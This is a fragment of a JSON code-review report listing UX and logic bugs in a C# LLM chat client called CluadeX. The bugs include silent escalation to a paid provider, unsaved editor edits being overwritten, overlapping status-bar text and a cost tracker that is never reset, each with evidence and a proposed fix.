+                             "scenario":  "Every harness feature that was supposed to tell the user what the loop is doing is invisible. The escalation banner โ€” the ONLY user-facing consent/notice for switching to a paid provider โ€” is never rendered. The auto-verify \u0027...\u0027 notice during a multi-minute build is never rendered. The user just sees a frozen chat.",
+                             "fix":  "In ChatViewModel\u0027s ctor (next to \u0027_agentService.OnToolExecuted += ...\u0027, line 410), subscribe: _agentService.OnAgentStatus += s =\u003e post/update an inline status bubble (reuse _activeAgentStatusMsg machinery) and StatusText. Alternatively replace the OnAgentStatus-only call sites with progress?.Report + a persistent ChatMessage for escalation."
+                         },
+                         {
+                             "title":  "Auto-verify (B1) runs up to 6 builds ร— 180s per task with no in-flight UI feedback โ€” the chat looks hung during every post-edit build",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1966,
+                             "severity":  "UX",
+                             "kind":  "hang",
+                             "evidence":  "Lines 1965-1970: \"autoVerifyCount++; OnAgentStatus?.Invoke(... \u0027Auto-verifying build after edit...\u0027); var verify = await _agentToolService.RunVerifyBuildAsync(ct); OnToolExecuted?.Invoke(verify);\" โ€” OnAgentStatus is dead (no subscribers), OnToolStarting is NOT invoked before the build, and the verify ToolAction bubble appears only AFTER RunVerifyBuildAsync returns. RunVerifyBuildAsync โ’ ExecuteRunBuildAsync uses timeout_ms=180000 (AgentToolService.cs:1459); MaxAutoVerifies = 6 (line 1529).",
+                             "scenario":  "Model edits a .cs file; auto-verify launches \u0027dotnet build\u0027 (60-180s on this repo). Inline chat: the last tool breadcrumb is finalized (_activeAgentStatusMsg=null after OnToolExecuted), nothing streams, no new bubble. Only the status bar\u0027s generic \u0027Taking longer than usual... (Ns)\u0027 ticks. Repeated up to 6ร— per task = many minutes of an apparently dead chat โ’ perceived hang. With AutoVerifyAfterEditEnabled defaulting to true, every local user gets this.",
+                             "fix":  "Fire OnToolStarting?.Invoke(\"run_build\", \"Auto-verifying: \u003ccmd\u003e\") before RunVerifyBuildAsync so the existing โต breadcrumb machinery shows a live \u0027buildingโ€ฆ\u0027 bubble (it already handles the streaming dot), and/or wire OnAgentStatus (see separate finding)."
+                         },
+                         {
+                             "title":  "Escalation silently switches to a paid API provider โ€” no chat banner, no consent moment, cost appears out of nowhere",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  2025,
+                             "severity":  "LOGIC",
+                             "kind":  "silent-failure",
+                             "evidence":  "Lines 2020-2035: \"hasEscalated = true; loopProvider = escalationProvider; ... OnAgentStatus?.Invoke(... $\\\"โคด Escalating to {elabel} (local model stuck)...\\\"); userResultMsg.Content.Add(new ... ContentBlock { ... Text = \\\"[escalation] A smaller local model was working on this task and got stuck...\\\" })\" โ€” OnAgentStatus has no subscribers, and the [escalation] block is a model-facing user message that is never rendered as a chat bubble. No ChatMessage is added to Messages.",
+                             "scenario":  "User enables EscalationEnabled in settings.json weeks earlier and forgets. A local task stagnates; mid-turn the loop hands the full conversation + tool results to Anthropic. The ONLY observable change is the status-bar CostText flipping from \u0027No API usage\u0027 to \u0027$0.41 (...)\u0027 up to 5s later (it is refreshed only by the 5s _memoryTimer, ChatViewModel.cs:494) โ€” easy to miss, with no explanation, no model name, no per-turn paid/free marker on the bubbles. Privacy angle too: the conversation leaves the machine without an in-context notice.",
+                             "fix":  "On escalation, add a persistent system-style ChatMessage to Messages/CurrentSession (e.g. \u0027โคด Local model stuck โ€” escalated to Claude (Anthropic). Further turns in this task are billed.\u0027), and tag subsequent assistant bubbles with the provider name. Consider an inline confirm (reuse the PermissionRequest bubble) before the first paid call."
+                         },
+                         {
+                             "title":  "ResolveEscalationProvider never checks IsReady โ€” escalation to an unconfigured provider kills the task with an auth error",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  2090,
+                             "severity":  "LOGIC",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "Lines 2085-2094: \"var p = _providerManager.GetProvider(t); if (p == null || ReferenceEquals(p, current)) return null; if (!p.SupportsNativeToolUse) return null; return p;\" โ€” no p.IsReady / API-key check (compare ChatViewModel.cs:1366 which gates sends on ActiveProvider.IsReady).",
+                             "scenario":  "EscalationEnabled=true, EscalationProviderName=Anthropic, but no Anthropic API key configured. Local model stagnates โ’ loopProvider switches to the keyless AnthropicProvider โ’ next ChatWithToolsAsync returns 401 โ’ exception bubbles out of the loop โ’ the whole multi-step task that the local model had half-finished dies with an authentication error instead of just continuing locally to max iterations.",
+                             "fix":  "Add \u0027if (!p.IsReady) return null;\u0027 to ResolveEscalationProvider (and log/inline-note \u0027escalation target not configured โ€” staying local\u0027)."
+                         },
+                         {
+                             "title":  "All 11 weak-model harness toggles are settings.json-only โ€” zero Settings UI (exact AppSettings fields)",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Models\\AppSettings.cs",
+                             "line":  142,
+                             "severity":  "LOGIC",
+                             "kind":  "wiring-gap",
+                             "evidence":  "AppSettings.cs declares: AutoVerifyAfterEditEnabled (line 130, default true), EscalationEnabled (line 142, default false), EscalationProviderName (line 145), PlanFirstForceToolEnabled (line 93, default true), MidLoopReminderEnabled (line 99, default true), MidLoopReminderEvery (line 101, default 4), LocalToolCallRepairEnabled (line 86, default true), InstinctLearningEnabled (line 187, default true), TopK (line 33), MinP (line 36), ToolCallTemperature (line 40). Grep of ViewModels/ and Views/ for these names matches ONLY AutoVerifyCommand (SettingsViewModel.cs:86, SettingsView.xaml:454). SettingsViewModel.Save (lines 579-627) writes none of them โ€” they survive only because Save mutates the existing Settings object.",
+                             "scenario":  "A user who suffers from any of these behaviors (auto-builds after every edit, forced first tool call hijacking trivial-but-long messages, repeated \u0027[reminder]\u0027 injections eating ctx, salvage misfires, escalation) has NO discoverable way to turn them off โ€” they must hand-edit settings.json with undocumented field names. Conversely a user who WANTS escalation can\u0027t discover it exists. Five of these default ON.",
+                             "fix":  "Add a \u0027Local Agent Harness\u0027 card in SettingsView (next to the Autonomous Loop card): checkboxes bound to AutoVerifyAfterEditEnabled, PlanFirstForceToolEnabled, MidLoopReminderEnabled (+ numeric MidLoopReminderEvery), LocalToolCallRepairEnabled, InstinctLearningEnabled; an Escalation group (EscalationEnabled checkbox with a cost/privacy warning + EscalationProviderName combo); and TopK/MinP/ToolCallTemperature under the sampling sliders. Mirror them in SettingsViewModel Load/Save."
+                         },
+                         {
+                             "title":  "InstinctLearningEnabled default silently flipped to true while its doc-comment and NewSession comment still say \u0027opt-in / off by default\u0027",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Models\\AppSettings.cs",
+                             "line":  187,
+                             "severity":  "LOGIC",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "AppSettings.cs:184-187: \"/// worked) into the Instinct system... Opt-in (off by default) because it spends tokens the user didn\u0027t explicitly request...\" immediately above \"public bool InstinctLearningEnabled { get; set; } = true;\" (changed falseโ’true in ee066da). ChatViewModel.cs:1146 still says \"// Disabled by default โ€” user opts in via settings.\" before _sessionMemoryService?.ExtractInBackground(...). SessionMemoryService.cs:54 gates the background LLM pass on this flag.",
+                             "scenario":  "User on a paid API provider ends a session (NewSession / app close) โ’ a background LLM transcript pass runs by default, spending tokens the user never asked for, with no Settings UI to disable it and no visible indicator that it ran (the known \u0027no visible indicator\u0027 gap). Cost ticks up \u0027by itself\u0027 โ’ user reads it as a bug.",
+                             "fix":  "Either restore \u0027= false\u0027 (matching the documented opt-in contract), or update both comments AND add the Settings checkbox + only-default-on-for-local-providers guard (e.g. enable extraction by default only when the active provider is Local/LlamaServer/Ollama)."
+                         },
+                         {
+                             "title":  "First-run Send on LlamaServer/Ollama with no model shows \u0027add your API key in Settings\u0027 โ€” wrong guidance for a local backend",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\ViewModels\\ChatViewModel.cs",
+                             "line":  1368,
+                             "severity":  "UX",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "Lines 1366-1373: \"string errorText = _providerManager.ActiveProviderType == AiProviderType.Local ? \\\"โ  **No model loaded.** Please go to the **Models** tab...\\\" : $\\\"โ  **{...DisplayName} not configured.** Please add your API key in **Settings**.\\\";\" โ€” only AiProviderType.Local gets the \u0027load a model\u0027 message. Since c95a986 routed local GPU to LlamaServer, the common first-run provider is LlamaServer (DisplayName \u0027llama.cpp Server (Local)\u0027, IsReady=false until a model loads).",
+                             "scenario":  "Fresh install, default/auto-routed LlamaServer provider, user types a message and hits Send โ’ \u0027โ  llama.cpp Server (Local) not configured. Please add your API key in Settings.\u0027 There is no API key for llama.cpp; the user hunts Settings for a nonexistent key field instead of going to the Models tab. Same for Ollama (should say \u0027start Ollama / pull a model\u0027).",
+                             "fix":  "Treat Local, LlamaServer and Ollama as the \u0027load a model\u0027 branch: switch on ActiveProviderType โ€” Local/LlamaServer โ’ \u0027No model loaded โ€” go to Models tab\u0027; Ollama โ’ \u0027Ollama is not running or no model selected\u0027; API providers โ’ keep the API-key message."
+                         },
+                         {
+                             "title":  "Live-follow clobbers unsaved editor edits: OnAgentFileMutated calls MarkOpened on a dirty tab with no confirmation",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\ViewModels\\CodeEditorViewModel.cs",
+                             "line":  130,
+                             "severity":  "CRITICAL",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "CodeEditorViewModel.cs:128-132: \"if (existing != null) { existing.MarkOpened(loaded.Content);   // refresh content in place (keep the tab object) ActiveTab = existing; }\" โ€” MarkOpened (CodeEditorModels.cs:38-48) overwrites _content/_originalContent and sets _isDirty=false unconditionally. No IsDirty check. LiveEditFollow defaults to true (AppSettings.cs:69).",
+                             "scenario":  "User has Foo.cs open in the Code Editor with unsaved manual edits (dirty โ—). They ask the agent to tweak something else in the same file. Agent edit_file succeeds โ’ FileMutatedByAgent โ’ MarkOpened replaces the tab\u0027s buffer with the on-disk content โ’ the user\u0027s unsaved edits are silently destroyed AND the dirty flag is cleared, so there\u0027s no warning and no way back. Also steals ActiveTab focus on every agent edit (annoying during multi-file turns, user gets yanked between tabs while typing).",
+                             "fix":  "In OnAgentFileMutated: if existing.IsDirty, skip the in-place refresh (or show a non-destructive banner \u0027file changed on disk โ€” Reload / Keep mine\u0027) instead of MarkOpened. Only set ActiveTab when the editor page is actually visible, or make tab-stealing a sub-option of LiveEditFollow."
+                         },
+                         {
+                             "title":  "Status bar: LastTurnStats and CostText both sit in Grid.Column=3 โ€” the two TextBlocks render overlapping",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Views\\ChatView.xaml",
+                             "line":  1325,
+                             "severity":  "UX",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "Line 1318: \u0027\u003cTextBlock Grid.Column=\"3\" Text=\"{Binding LastTurnStats}\" ... Margin=\"6,0\"\u0027 and line 1325: \u0027\u003cTextBlock Grid.Column=\"3\" Text=\"{Binding CostText}\" ... Margin=\"6,0\"\u0027 โ€” same Grid cell of the 6-column status Grid (defined lines 1164-1171); Grid overlays children in the same cell, it does not stack them.",
+                             "scenario":  "After the first completed turn both bindings are non-empty (local users: LastTurnStats=\u00271234 tok ยท 45s\u0027 over CostText=\u0027No API usage\u0027; API users: stats over \u0027$0.0123 (15,000 in / ...)\u0027). The two strings draw on top of each other โ’ illegible smudge. This is the ONLY place the paid-vs-free signal lives, so the cost readout โ€” the thing that distinguishes a free local turn from a paid one โ€” is unreadable.",
+                             "fix":  "Give CostText its own column (shift it to Grid.Column=\"4\" and the Review/Auto panel to 5, adding a ColumnDefinition), or wrap both in a single horizontal StackPanel in column 3."
+                         },
+                         {
+                             "title":  "Step counter denominator wrong after escalation/extension: shows \u0027Step 27/25\u0027",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1615,
+                             "severity":  "MINOR",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "Line 1613-1615: nativeStepStatus = \u0027... $\"Step {iteration + 1}/{MaxAgentIterations} ยท {nativeThinkVerb}...\"\u0027 while the loop bound is \u0027iteration \u003c iterationBudget\u0027 (line 1605) and escalation sets \u0027iterationBudget = iteration + 1 + EscalationBonusIterations\u0027 (line 2023), which can exceed MaxAgentIterations.",
+                             "scenario":  "Escalation grants 8 bonus iterations at iteration 24 of 25 โ’ status bar reports \u0027Step 27/25\u0027, \u0027Step 30/25\u0027 โ€” looks like a runaway loop to the user.",
+                             "fix":  "Use iterationBudget as the denominator: $\"Step {iteration + 1}/{iterationBudget}\"."
+                         },
+                         {
+                             "title":  "Live-follow scroll uses a hardcoded 20px line height โ€” lands on the wrong line for non-default font/DPI",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Views\\CodeEditorView.xaml.cs",
+                             "line":  40,
+                             "severity":  "MINOR",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "OnScrollToLine: \u0027EditorScroll?.ScrollToVerticalOffset(Math.Max(0, idx * 20.0 - 60));\u0027 โ€” the TextBox is FontSize=13 mono; actual line height is ~17.3px at 96 DPI and scales with system DPI/text scaling, so the estimate drifts ~13% per line. Also \u0027EditorTextBox.Select(start, len)\u0027 renders no visible highlight because the TextBox is not focused (IsInactiveSelectionHighlightEnabled not set).",
+                             "scenario":  "Agent edits line 400 of a 600-line file โ’ live-follow scrolls to offset 400*20 instead of ~400*17.3 โ’ viewport lands ~60 lines past the change; the \u0027selection\u0027 marking the changed line is invisible. Feature appears broken (\u0027it jumped somewhere random\u0027).",
+                             "fix":  "Compute the real line height (EditorTextBox.FontFamily.LineSpacing * FontSize, or GetRectFromCharacterIndex(start).Top) and scroll to that; set IsInactiveSelectionHighlightEnabled=\"True\" on EditorTextBox so the selected line is visible without focus."
+                         },
+                         {
+                             "title":  "Cost tracker is never reset per session and CostText refreshes only on a 5s timer โ€” \u0027Session API cost\u0027 tooltip lies",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CostTrackingService.cs",
+                             "line":  83,
+                             "severity":  "MINOR",
+                             "kind":  "wiring-gap",
+                             "evidence":  "CostTrackingService.Reset() (line 83) has zero callers (grep \u0027_costTracker.Reset\u0027 โ’ no matches); ChatView.xaml:1329 ToolTip=\"Session API cost (USD)\"; CostText is updated only inside the 5-second _memoryTimer tick (ChatViewModel.cs:494) โ€” the OnCostUpdated event (CostTrackingService.cs:24) is never subscribed.",
+                             "scenario":  "User runs several chat sessions in one app run: the \u0027Session API cost\u0027 figure is actually the cumulative app-lifetime cost, so per-session cost is unknowable. After an escalated or API turn, the number also appears up to 5s late, decoupled from the turn that caused it. (Double-counting itself is fine: the legacy stream records output via cumulative deltas at AnthropicProvider.cs:283-293 and the native path records once at line 623-624 โ€” separate paths, no regression found.)",
+                             "fix":  "Call _costTracker.Reset() in NewSession/LoadSession (or track per-session subtotals), and subscribe ChatViewModel to OnCostUpdated to refresh CostText immediately instead of polling."
+                         }
+                     ]
+    }
+]
